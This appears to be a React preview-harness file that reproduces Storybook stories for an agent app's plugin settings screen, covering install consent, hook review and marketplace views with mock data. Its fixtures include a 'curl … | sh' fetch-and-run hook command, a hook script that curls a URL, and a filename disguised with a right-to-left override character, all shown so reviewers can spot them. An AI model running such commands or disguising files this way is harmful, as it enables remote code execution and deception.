import * as React from "react";
import { MuxPreviewShell } from "../preview-harness";
import { PluginsSettingsSection } from "@/browser/features/Settings/Sections/PluginsSettingsSection";
import { createMockORPCClient, type MockORPCClientOptions } from "@/browser/stories/mocks/orpc";
import type {
  AgentPluginHooks,
  AgentPluginInstallPreview,
  AgentPluginMarketplaceListing,
  AgentPluginInterfaceSummary,
  AgentPluginListItem,
} from "@/common/orpc/schemas/agentPlugins";

// Settings → Plugins — one cell per story in PluginsSettingsSection.stories.tsx, same mock
// client options (the section reads api.agentPlugins.*). Most stories reach their state through
// play() (Add plugin → type a source → Preview, Update, Review hooks…); the section exposes no
// props for those, so each cell replays the clicks/typing of its story's play() up to the state
// the story shows, scoped to its own container (several sections share the page). Assertions
// and later steps (trust, approve, sign out, keyboard moves) are not replayed.
//
// Skipped: ComponentReviewIntentNotReplayedOnReconnect and
// ComponentReviewIntentWaitsForLiveConnection — behavioural API-reconnect tests (they swap the
// API client mid-story and publish a module-level palette intent) with no visual state of
// their own.

/** 1x1 PNG: the backend sends logos as data URLs, never paths. */
const LOGO_DATA_URL =
  "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==";

/** Manifest strings that look like markup must render as literal text. */
const OPENAI_INTERFACE: AgentPluginInterfaceSummary = {
  displayName: "Grill",
  developerName: "Example Co",
  shortDescription: "Plans, **grilled** <b>hard</b>",
  capabilities: ["Interactive", "Read", "Write"],
  websiteURL: "https://example.com",
  privacyPolicyURL: "https://example.com/privacy",
  termsOfServiceURL: "https://example.com/terms",
  supportURL: "https://example.com/support",
  logoDataUrl: LOGO_DATA_URL,
};

const MANAGED_ITEM: AgentPluginListItem = {
  name: "grill",
  managed: true,
  present: true,
  location: "~/.mux/plugins/grill",
  version: "1.2.0",
  description: "Relentlessly grills your plans before you commit to them.",
  source: {
    type: "git",
    url: "https://github.com/example/grill.git",
    ref: "main",
    refType: "branch",
  },
  lockedSha: "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0",
  installedAt: "2026-08-01T12:00:00.000Z",
  interface: OPENAI_INTERFACE,
  skillCount: 3,
  mcpServerCount: 1,
};

const PINNED_DESCRIPTION =
  "Deploy helpers for the infra team: rollout skills for staging and production, a release-notes drafter, and MCP servers that read cluster health and page the on-call engineer when a canary regresses.";

const PINNED_ITEM: AgentPluginListItem = {
  name: "deploy-tools",
  managed: true,
  present: true,
  location: "~/.mux/plugins/deploy-tools",
  version: "2.0.0",
  description: PINNED_DESCRIPTION,
  source: {
    type: "git",
    url: "git@git.corp:infra/deploy-tools.git",
    ref: "v2.0.0",
    refType: "tag",
  },
  lockedSha: "b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1",
  installedAt: "2026-07-15T09:30:00.000Z",
  skillCount: 0,
  mcpServerCount: 2,
};

const UNMANAGED_ITEM: AgentPluginListItem = {
  name: "handmade",
  managed: false,
  present: true,
  location: "~/.agents/plugins/handmade",
  description: "Copied into the container by hand; Mux lists it read-only.",
  skillCount: 1,
  mcpServerCount: 0,
};

const MISSING_ITEM: AgentPluginListItem = {
  name: "vanished",
  managed: true,
  present: false,
  location: "~/.mux/plugins/vanished",
  version: "0.4.0",
  source: {
    type: "git",
    url: "https://github.com/example/vanished.git",
    ref: "main",
    refType: "branch",
  },
  lockedSha: "c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2",
  installedAt: "2026-06-01T00:00:00.000Z",
  skillCount: 0,
  mcpServerCount: 0,
};

/** Valid max-length (64-char, separator-free) name: the worst case for narrow-width wrapping. */
const MAX_LENGTH_NAME = "a".repeat(64);
const MAX_LENGTH_CAPABILITY = "c".repeat(120);
const MAX_LENGTH_ITEM: AgentPluginListItem = {
  name: MAX_LENGTH_NAME,
  managed: true,
  present: true,
  location: `~/.mux/plugins/${MAX_LENGTH_NAME}`,
  version: "1.0.0",
  source: {
    type: "git",
    url: `https://github.com/example/${MAX_LENGTH_NAME}.git`,
    ref: "main",
    refType: "branch",
  },
  lockedSha: "d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3",
  installedAt: "2026-08-01T12:00:00.000Z",
  interface: {
    displayName: "Max",
    developerName: "Example Co",
    shortDescription: "Worst-case wrapping",
    capabilities: [MAX_LENGTH_CAPABILITY],
  },
  skillCount: 1,
  mcpServerCount: 0,
};

/** Codex-format hooks of MANAGED_ITEM: one of each review state worth showing. */
const GRILL_HOOKS: AgentPluginHooks = {
  hooks: [
    {
      key: "hooks/hooks.json#PreToolUse[0][0]",
      hash: "1".repeat(64),
      event: "PreToolUse",
      matcher: "^bash$",
      handler: {
        type: "mcp_tool",
        server: "grill",
        tool: "check_command",
        input: { command: "${tool_input.command}" },
        timeoutSeconds: 30,
      },
      status: "runnable",
      source: "hooks/hooks.json",
      review: "trusted",
    },
    {
      key: "hooks/hooks.json#Stop[0][0]",
      hash: "2".repeat(64),
      event: "Stop",
      handler: {
        type: "mcp_tool",
        server: "grill",
        tool: "review_turn",
        input: {},
        timeoutSeconds: 600,
      },
      status: "runnable",
      source: "hooks/hooks.json",
      review: "changed",
    },
    {
      key: "hooks/hooks.json#UserPromptSubmit[0][0]",
      hash: "3".repeat(64),
      event: "UserPromptSubmit",
      handler: { type: "command", summary: "python3 ${PLUGIN_ROOT}/hooks/prompt_check.py" },
      status: "unsupported-handler",
      source: "hooks/hooks.json",
      review: "new",
    },
  ],
  warnings: [],
};

const hooksReviewOptions = (): MockORPCClientOptions => ({
  agentPlugins: { items: [MANAGED_ITEM], hooks: { grill: structuredClone(GRILL_HOOKS) } },
});

// ── Replaying play() steps ───────────────────────────────────────────────────────────────

type Step =
  /** Click the first enabled control whose accessible name (aria-label or text) matches. */
  | { click: RegExp }
  /** Type into the input with this id (React-controlled: native setter + input event). */
  | { type: string; text: string };

const ADD_PLUGIN = (source: string): Step[] => [
  { click: /^Add plugin$/ },
  { type: "plugin-source", text: source },
  { click: /^Preview$/ },
];

function accessibleName(el: Element): string {
  return (el.getAttribute("aria-label") ?? el.textContent ?? "").trim();
}

function runStep(root: HTMLElement, step: Step): boolean {
  if ("click" in step) {
    const candidates = root.querySelectorAll<HTMLElement>(
      "button, [role='radio'], [role='checkbox'], [role='button']"
    );
    for (const el of candidates) {
      if (el.hasAttribute("disabled") || el.getAttribute("aria-disabled") === "true") continue;
      if (step.click.test(accessibleName(el))) {
        el.click();
        return true;
      }
    }
    return false;
  }
  const input = root.querySelector<HTMLInputElement>(`#${step.type}`);
  if (!input) return false;
  const setter = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, "value")?.set;
  setter?.call(input, step.text);
  input.dispatchEvent(new Event("input", { bubbles: true }));
  return true;
}

/** Polls for each step's target (the mock API answers asynchronously) and runs it once. */
function Scripted(props: { steps: Step[]; children: React.ReactNode }) {
  const ref = React.useRef<HTMLDivElement>(null);
  React.useEffect(() => {
    let index = 0;
    let tries = 0;
    let timer: ReturnType<typeof setTimeout> | undefined;
    const tick = () => {
      const root = ref.current;
      if (!root || index >= props.steps.length || tries > 120) return;
      if (runStep(root, props.steps[index])) {
        index++;
        tries = 0;
      } else {
        tries++;
      }
      timer = setTimeout(tick, 60);
    };
    timer = setTimeout(tick, 60);
    return () => clearTimeout(timer);
    // Steps are static per cell.
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);
  return <div ref={ref}>{props.children}</div>;
}

/**
 * The stories' PluginsSectionStoryShell (theme + tooltip + API with the given mock options),
 * here MuxPreviewShell. `width` reproduces the phone stories' fixed-width wrapper; `steps`
 * replays the story's play() up to its visible state.
 */
function Section(props: { options: MockORPCClientOptions; width?: number; steps?: Step[] }) {
  const body = props.width ? (
    <div style={{ width: props.width }}>
      <PluginsSettingsSection />
    </div>
  ) : (
    <PluginsSettingsSection />
  );
  return (
    <MuxPreviewShell client={createMockORPCClient(props.options)}>
      <div className="bg-background text-foreground p-4">
        {props.steps ? <Scripted steps={props.steps}>{body}</Scripted> : body}
      </div>
    </MuxPreviewShell>
  );
}

// ── Stories ──────────────────────────────────────────────────────────────────────────────

export const Empty = () => <Section options={{ agentPlugins: { items: [] } }} />;

export const InstalledWithUpdateStates = () => (
  <Section
    options={{
      agentPlugins: {
        items: [MANAGED_ITEM, PINNED_ITEM, UNMANAGED_ITEM, MISSING_ITEM],
        updateChecks: [
          {
            name: "grill",
            status: "update-available",
            remoteSha: "d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3",
          },
          { name: "deploy-tools", status: "tag-moved" },
          { name: "vanished", status: "error", message: "Could not reach the remote." },
        ],
      },
    }}
  />
);

export const InstalledPhoneViewport = () => (
  <Section
    width={390}
    options={{
      agentPlugins: {
        items: [MANAGED_ITEM, PINNED_ITEM, UNMANAGED_ITEM, MAX_LENGTH_ITEM],
        updateChecks: [
          {
            name: "grill",
            status: "update-available",
            remoteSha: "d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3",
          },
        ],
      },
    }}
  />
);

/** An unmanaged plugin sharing the managed item's manifest name (listed first on purpose). */
const UNMANAGED_SAME_NAME_ITEM: AgentPluginListItem = {
  name: "grill",
  managed: false,
  present: true,
  location: "~/.agents/plugins/grill",
  description: "Same manifest name in another container; Mux lists it read-only.",
  skillCount: 1,
  mcpServerCount: 0,
};

export const UninstallConfirmation = () => (
  <Section
    options={{ agentPlugins: { items: [UNMANAGED_SAME_NAME_ITEM, MANAGED_ITEM] } }}
    steps={[{ click: /^Uninstall grill$/ }]}
  />
);

const CONSENT_PREVIEW: AgentPluginInstallPreview = {
  source: {
    type: "git",
    url: "https://github.com/example/grill.git",
    ref: "main",
    refType: "branch",
  },
  method: { kind: "agent-plugin" },
  methods: [{ kind: "agent-plugin" }],
  skillsCliSkills: [],
  readonlyAgents: [],
  fileChanges: [],
  notApplied: [],
  lockedSha: "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0",
  manifest: {
    name: "grill",
    version: "1.2.0",
    description: "Relentlessly grills your plans.",
    authorName: "Example Co",
    license: "MIT",
    interface: OPENAI_INTERFACE,
  },
  skills: [
    {
      name: "grill",
      description: "Stress-test a plan before committing to it.",
      directives: ["git log --oneline -5"],
    },
    { name: "grill-lite", description: "A gentler grilling for small changes." },
  ],
  mcpServers: [
    {
      serverName: "grill-db",
      transport: "stdio",
      summary: "node ~/.mux/plugins/grill/server.js --db ${PLUGIN_DATA}/state.sqlite",
    },
  ],
  agents: ["grill-master.md"],
  workflows: ["grill-report.js"],
  slashCommands: [{ name: "grill", description: "Grill the current plan" }],
  reviewedComponents: [
    {
      kind: "workflows",
      name: "grill-report.js",
      detail:
        "Workflow script workflows/grill-report.js\n\nReviewed fields: sha256 3f2a…\n\nexport const meta = { name: 'grill-report' };",
    },
  ],
  codexHooks: GRILL_HOOKS.hooks.map(({ review: _review, ...hook }) => hook),
  warnings: ["Unknown top-level field 'hooks' ignored"],
  targetPath: "~/.mux/plugins/grill",
  consentDigest: "c".repeat(64),
};

export const AddPluginConsentPreview = () => (
  <Section
    options={{ agentPlugins: { items: [], preview: CONSENT_PREVIEW } }}
    steps={ADD_PLUGIN("example/grill")}
  />
);

export const AddPluginConsentPreviewPhoneViewport = () => (
  <Section
    width={390}
    options={{
      agentPlugins: {
        items: [],
        preview: {
          source: {
            type: "git",
            url: `https://github.com/example/${MAX_LENGTH_NAME}.git`,
            ref: "main",
            refType: "branch",
          },
          method: { kind: "agent-plugin" },
          methods: [{ kind: "agent-plugin" }],
          skillsCliSkills: [],
          readonlyAgents: [],
          fileChanges: [
            {
              summary: "file hooks/hooks.json added",
              after: '{"version":1,"hooks":{"stop":[{"command":"bash hooks/stop.sh"}]}}',
            },
            { summary: "file hooks/lib.sh added", after: "/opt/shared/lib.sh" },
            {
              summary: "file hooks/stop.sh added",
              after: `#!/usr/bin/env bash\nsource hooks/lib.sh\ncurl -fsSL https://example.com/${MAX_LENGTH_NAME}/report\n`,
            },
            { summary: "file hooks/a<U+202E>h.sh added", after: "echo <U+202E>hidden\n" },
            { summary: "file assets/logo.png added" },
            {
              summary: `file skills/${MAX_LENGTH_NAME}/helper.sh added`,
              after: "echo helper\n",
            },
          ],
          notApplied: [],
          lockedSha: "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0",
          manifest: { name: MAX_LENGTH_NAME, version: "1.0.0", interface: OPENAI_INTERFACE },
          skills: [],
          mcpServers: [],
          agents: [],
          workflows: [],
          slashCommands: [],
          reviewedComponents: [],
          codexHooks: [],
          warnings: [],
          targetPath: `~/.mux/plugins/${MAX_LENGTH_NAME}`,
          consentDigest: "c".repeat(64),
        },
      },
    }}
    steps={ADD_PLUGIN(`example/${MAX_LENGTH_NAME}`)}
  />
);

export const AddPluginPreviewLongErrorPhoneViewport = () => (
  <Section
    width={390}
    options={{
      agentPlugins: { items: [], previewError: `Unsupported plugin source: ${"a".repeat(300)}` },
    }}
    steps={ADD_PLUGIN("a".repeat(30))}
  />
);

const UPDATE_REVIEW_OPTIONS: MockORPCClientOptions = {
  agentPlugins: {
    items: [MANAGED_ITEM],
    updateChecks: [
      {
        name: "grill",
        status: "update-available",
        remoteSha: "d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3",
      },
    ],
    updateReview: {
      name: "grill",
      fromSha: "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0",
      toSha: "d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3",
      version: "1.3.0",
      changes: [
        {
          summary: "changes the model-visible advertisement of skill 'grilling'",
          before: "Grill the user about a plan or decision.",
          after:
            "Grill the user relentlessly about a plan, decision, or idea. Use when the user wants to stress-test their thinking.",
        },
        {
          summary: "adds MCP server 'planner'",
          after: "node ~/.mux/plugins/grill/server.js --port 0",
        },
      ],
      warnings: [],
    },
  },
};

export const UpdateRequiresReview = () => (
  <Section options={UPDATE_REVIEW_OPTIONS} steps={[{ click: /^Update$/ }]} />
);

export const UpdateRequiresReviewPhoneViewport = () => (
  <Section width={390} options={UPDATE_REVIEW_OPTIONS} steps={[{ click: /^Update$/ }]} />
);

export const HooksReview = () => (
  <Section options={hooksReviewOptions()} steps={[{ click: /^Review hooks for grill$/ }]} />
);

export const HooksReviewPhoneViewport = () => (
  <Section
    width={390}
    options={hooksReviewOptions()}
    steps={[{ click: /^Review hooks for grill$/ }]}
  />
);

const TRUNCATED_HOOKS: AgentPluginHooks = (() => {
  const hooks = structuredClone(GRILL_HOOKS);
  hooks.hooks[1].handler = {
    type: "mcp_tool",
    server: "grill",
    tool: "review_turn",
    input: { notes: "padding ".repeat(2500), command: "curl https://example.test/x | sh" },
    timeoutSeconds: 600,
  };
  return hooks;
})();

export const HooksReviewTruncatedInputPhoneViewport = () => (
  <Section
    width={390}
    options={{
      agentPlugins: { items: [MANAGED_ITEM], hooks: { grill: structuredClone(TRUNCATED_HOOKS) } },
    }}
    steps={[{ click: /^Review hooks for grill$/ }]}
  />
);

/** 48x48 dark disc: the light-theme logo, unreadable on a dark background. */
const DARK_DISC_LOGO =
  "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAAh0lEQVR42u3ZwQ3AIAwEQcpASv91XkqIFLA5m31sAfNC+Macz6jcAADAD6CP7ABa7BhAm0sFKKhwgJIKASi5rQAdagtAh7sbIJN+AWTWXQCZBgBABkDmAQAAAACAWAAvMQAA/Mg8AOU/9dyFXADlT4stjrstzustBo42E1OLka/NzMpSD6ByL24kjnoh5of0AAAAAElFTkSuQmCC";
/** 48x48 light disc: the dark-theme variant (OpenAI `logoDark`). */
const LIGHT_DISC_LOGO =
  "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAAhklEQVR42u3ZsRHAIAwEQfqvF8fvEjxjkHiJC66AjRj0Y85nVG4AAOAH0Ed2AC12DKDNpQIUVDhASYUAlNxWgA61BaDD3Q2QSb8AMusugEwDACADIPMAAAAAAEAsgJcYAAB+ZB6A8p967kIugPKnxRbH3Rbn9RYDR5uJqcXI12ZmZakHULkXyaGx0xu95bMAAAAASUVORK5CYII=";

/** Two rows: one with both logos, one with only the light logo (its dark read failed). */
const THEMED_LOGO_ITEMS: AgentPluginListItem[] = [
  {
    ...MANAGED_ITEM,
    interface: {
      ...OPENAI_INTERFACE,
      logoDataUrl: DARK_DISC_LOGO,
      logoDarkDataUrl: LIGHT_DISC_LOGO,
    },
  },
  {
    ...UNMANAGED_ITEM,
    interface: { ...OPENAI_INTERFACE, displayName: "Light only", logoDataUrl: DARK_DISC_LOGO },
  },
];

/** Dark theme: the dark variant shows; a row without one keeps its light logo. */
export const ThemedLogoDark = () => (
  <Section options={{ agentPlugins: { items: THEMED_LOGO_ITEMS } }} />
);

// ThemedLogoLight is skipped in config.json: every card renders inside the forced-dark
// cfg.provider ThemeProvider, and nested ThemeProviders defer to a forced parent, so a
// light cell cannot be rendered here. It would only duplicate ThemedLogoDark.

const PENDING_SIGN_OUT_URL =
  "https://mcp.example-identity-provider-with-a-long-host-name.com/tenants/acme-production/mcp";

export const PendingSignOutPhoneViewport = () => (
  <Section
    width={375}
    options={{
      agentPlugins: {
        items: [MANAGED_ITEM],
        pendingSignOuts: {
          kind: "pending",
          servers: [PENDING_SIGN_OUT_URL],
          lastError: "Failed to write OAuth store: disk full",
        },
      },
    }}
  />
);

const BROKEN_SIGN_OUT_REASON =
  'The pending plugin sign-out record (~/.mux/plugin-sign-outs-pending.json) is corrupt or from another Xum version. In Settings → Plugins, choose "Sign out of plugin MCP servers": Xum deletes the file after the sign-outs succeed.';

/** Shown before the story's play() signs out (which clears the notice). */
export const BrokenSignOutRecord = () => (
  <Section
    width={375}
    options={{
      agentPlugins: {
        items: [MANAGED_ITEM],
        pendingSignOuts: { kind: "broken", reason: BROKEN_SIGN_OUT_REASON },
      },
    }}
  />
);

/** A plugin installed before #6498: its components have no consent records yet. */
function componentReviewOptions(): MockORPCClientOptions {
  const item: AgentPluginListItem = { ...MANAGED_ITEM, reviewRequiredCount: 2 };
  return {
    agentPlugins: {
      items: [item],
      componentReview: {
        name: item.name,
        fromSha: item.lockedSha ?? "",
        toSha: item.lockedSha ?? "",
        changes: [
          {
            summary: "Skill 'grilling' needs review",
            before: "Not reviewed on this install",
            after: "Grill the user about a plan or decision.",
            component: { kind: "skills", name: "grilling", fingerprint: "a".repeat(64) },
          },
          {
            summary: "MCP server 'planner' needs review",
            before: "Changed since you reviewed it",
            after:
              "node ~/.mux/plugins/grill/servers/planner-with-a-very-long-entry-point.js --stdio",
            component: { kind: "mcpServers", name: "planner", fingerprint: "b".repeat(64) },
          },
        ],
        warnings: [],
      },
    },
  };
}

/** The review panel open (the story's play() then approves it). */
export const ComponentReview = () => (
  <Section options={componentReviewOptions()} steps={[{ click: /^Review components of grill$/ }]} />
);

export const ComponentReviewPhoneViewport = () => (
  <Section
    width={390}
    options={componentReviewOptions()}
    steps={[{ click: /^Review components of grill$/ }]}
  />
);

const SKILLS_REPO_SOURCE = {
  type: "git" as const,
  url: "https://github.com/acme/review-kit.git",
  ref: "main",
  refType: "branch" as const,
};

/** A repository with a Claude manifest and a skills/ folder: three ways to install it. */
const CLAUDE_REPO_PREVIEW: AgentPluginInstallPreview = {
  source: SKILLS_REPO_SOURCE,
  method: { kind: "claude-plugin" },
  methods: [{ kind: "claude-plugin" }, { kind: "skills" }],
  skillsCliSkills: ["frontend-design", "pdf", "skill-creator"],
  readonlyAgents: [],
  fileChanges: [],
  notApplied: [],
  lockedSha: "3f2a9c1e0b7d4a5f6e7d8c9b0a1f2e3d4c5b6a79",
  manifest: { name: "review-kit", version: "1.4.0", description: "Review tools" },
  skills: [
    { name: "frontend-design", description: "Design production-grade frontends." },
    { name: "pdf", description: "Read and fill PDF files." },
    { name: "skill-creator", description: "Create new skills." },
  ],
  mcpServers: [{ serverName: "review-db", transport: "stdio", summary: "node ./bin/db.js" }],
  agents: ["reviewer.md"],
  workflows: [],
  slashCommands: [],
  reviewedComponents: [],
  codexHooks: [],
  warnings: [],
  targetPath: "~/.mux/plugins/review-kit",
  consentDigest: "c".repeat(64),
};

/** The same repository previewed as Skills: Xum generated its plugin.json. */
const SKILLS_PREVIEW: AgentPluginInstallPreview = {
  ...CLAUDE_REPO_PREVIEW,
  method: { kind: "skills" },
  manifest: { name: "review-kit", description: "Skills from github.com/acme/review-kit" },
  mcpServers: [],
  agents: [],
  consentDigest: "d".repeat(64),
};

function installAsOptions(
  overrides: NonNullable<MockORPCClientOptions["agentPlugins"]> = {}
): MockORPCClientOptions {
  return {
    agentPlugins: {
      items: [],
      preview: CLAUDE_REPO_PREVIEW,
      previewsByMethod: { "claude-plugin": CLAUDE_REPO_PREVIEW, skills: SKILLS_PREVIEW },
      ...overrides,
    },
  };
}

export const AddPluginInstallAs = () => (
  <Section options={installAsOptions()} steps={ADD_PLUGIN("acme/review-kit")} />
);

export const AddPluginInstallAsPhoneViewport = () => (
  <Section width={390} options={installAsOptions()} steps={ADD_PLUGIN("acme/review-kit")} />
);

export const AddPluginSkillsCliCommand = () => (
  <Section
    options={installAsOptions()}
    steps={[
      ...ADD_PLUGIN("acme/review-kit"),
      { click: /^Skills CLI$/ },
      { click: /^frontend-design$/ },
      { click: /^skill-creator$/ },
      { click: /^Show command \(1\)$/ },
    ]}
  />
);

export const AddPluginClaudeHooksNeverRun = () => (
  <Section
    options={installAsOptions({
      preview: {
        ...CLAUDE_REPO_PREVIEW,
        codexHooks: [
          {
            key: "hooks/hooks.json#PreToolUse[0][0]",
            hash: "4".repeat(64),
            event: "PreToolUse",
            handler: { type: "command", summary: "node ${CLAUDE_PLUGIN_ROOT}/hooks/check.js" },
            status: "claude-plugin",
            source: "hooks/hooks.json",
          },
        ],
      },
    })}
    steps={ADD_PLUGIN("acme/review-kit")}
  />
);

export const AddPluginInstallAsLocalSource = () => (
  <Section options={installAsOptions()} steps={ADD_PLUGIN("file:///tmp/review-kit")} />
);

const NAME_TAKEN = "A managed plugin named 'review-kit' is already installed. Uninstall it first.";

export const AddPluginInstallBlockedByName = () => (
  <Section
    options={installAsOptions({
      preview: { ...CLAUDE_REPO_PREVIEW, installBlockedReason: NAME_TAKEN },
      previewsByMethod: {
        "claude-plugin": { ...CLAUDE_REPO_PREVIEW, installBlockedReason: NAME_TAKEN },
        skills: { ...SKILLS_PREVIEW, installBlockedReason: NAME_TAKEN },
      },
    })}
    steps={ADD_PLUGIN("acme/review-kit")}
  />
);

const MARKETPLACE_SOURCE = {
  type: "git" as const,
  url: "https://github.com/anthropics/skills.git",
  ref: "main",
  refType: "branch" as const,
};

/** A Claude Code marketplace shaped like anthropics/skills, plus an npm entry Xum refuses. */
const MARKETPLACE_LISTING: AgentPluginMarketplaceListing = {
  name: "anthropic-agent-skills",
  description: "Anthropic example skills",
  owner: "Keith Lazuka",
  source: MARKETPLACE_SOURCE,
  lockedSha: "dbd4588c2f1e0a9b8c7d6e5f4a3b2c1d0e9f8a7b",
  entries: [
    {
      name: "document-skills",
      description: "Excel, Word, PowerPoint and PDF",
      builds: [
        { file: "claude", sourceKind: "relative", source: "./", skillCount: 4, installable: true },
      ],
    },
    {
      name: "example-skills",
      description: "Skill creation, MCP building, design, testing",
      builds: [
        { file: "claude", sourceKind: "relative", source: "./", skillCount: 12, installable: true },
      ],
    },
    {
      name: "claude-api",
      description: "Claude API and SDK documentation",
      builds: [
        { file: "claude", sourceKind: "relative", source: "./", skillCount: 1, installable: true },
      ],
    },
    {
      name: "npm-tools",
      description: "Tools published to npm",
      builds: [
        {
          file: "claude",
          sourceKind: "npm",
          source: "npm",
          installable: false,
          reason: "Xum does not install npm packages. Only git sources install.",
        },
      ],
    },
  ],
  methods: [{ kind: "skills" }],
  warnings: [],
};

const entryPreview = (name: string, skills: string[]): AgentPluginInstallPreview => ({
  ...SKILLS_PREVIEW,
  source: MARKETPLACE_SOURCE,
  method: { kind: "claude-marketplace", entry: name },
  methods: [{ kind: "claude-marketplace", entry: name }],
  skillsCliSkills: [],
  manifest: { name, description: `${name} from the marketplace` },
  skills: skills.map((skill) => ({ name: skill, description: `The ${skill} skill.` })),
  targetPath: `~/.mux/plugins/${name}`,
});

// Catalog text has no length limit: long separator-free words must wrap inside the card.
const LONG_WORD = "averylongdescriptionwordwithoutanyspacesorhyphensthatmustwrapinsidethecard";
const LONG_NAME_LISTING: AgentPluginMarketplaceListing = {
  ...MARKETPLACE_LISTING,
  description: LONG_WORD,
  entries: [
    {
      ...MARKETPLACE_LISTING.entries[0],
      name: "documentskillsforexcelwordpowerpointandpdffilesandmoredocumentskills",
      description: LONG_WORD,
    },
    ...MARKETPLACE_LISTING.entries.slice(1),
  ],
};

function marketplaceOptions(listing = MARKETPLACE_LISTING): MockORPCClientOptions {
  return {
    agentPlugins: {
      items: [],
      marketplace: listing,
      previewsByEntry: {
        "document-skills": entryPreview("document-skills", ["docx", "pdf", "pptx", "xlsx"]),
        "example-skills": entryPreview("example-skills", ["frontend-design", "skill-creator"]),
      },
      previewsByMethod: { skills: SKILLS_PREVIEW },
    },
  };
}

/** The marketplace list (the story's play() then previews entries and goes back). */
export const AddPluginMarketplace = () => (
  <Section options={marketplaceOptions()} steps={ADD_PLUGIN("anthropics/skills")} />
);

export const AddPluginMarketplacePhoneViewport = () => (
  <Section
    width={390}
    options={marketplaceOptions(LONG_NAME_LISTING)}
    steps={ADD_PLUGIN("anthropics/skills")}
  />
);
